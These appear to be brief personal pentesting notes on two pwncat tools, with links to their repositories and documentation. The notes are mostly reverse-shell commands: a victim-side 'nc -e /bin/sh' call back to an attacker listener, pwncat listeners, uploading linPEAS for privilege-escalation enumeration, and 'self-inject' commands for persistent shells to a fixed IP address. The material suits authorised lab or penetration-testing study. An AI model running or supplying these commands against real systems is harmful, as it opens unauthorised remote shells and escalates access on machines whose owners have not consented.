# pwncat (john hammond)

https://github.com/calebstewart/pwncat.

https://pwncat.readthedocs.io/en/latest/usage.html

```
L >pwncat -l 4444 |. pwncat bind://0.0.0.0:4444
V >nc -e /bin/sh 10.0.0.1 4444
L >cntrl+d 
L >run help
```
``` 
(local) > upload /opt/linpeas.sh

(local) > enum -s -a
```
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS


# pwncat

https://github.com/cytopia/pwncat

unbreakable reverse shells
```
pwncat -l 4444 --self-inject /bin/sh:192.168.137.114:4444
pwncat -l 4444 --self-inject /bin/sh:192.168.137.114:4444+3
cntrl+c 

pwncat -l 4444 -vv
or
nc -lnvp 4444
```
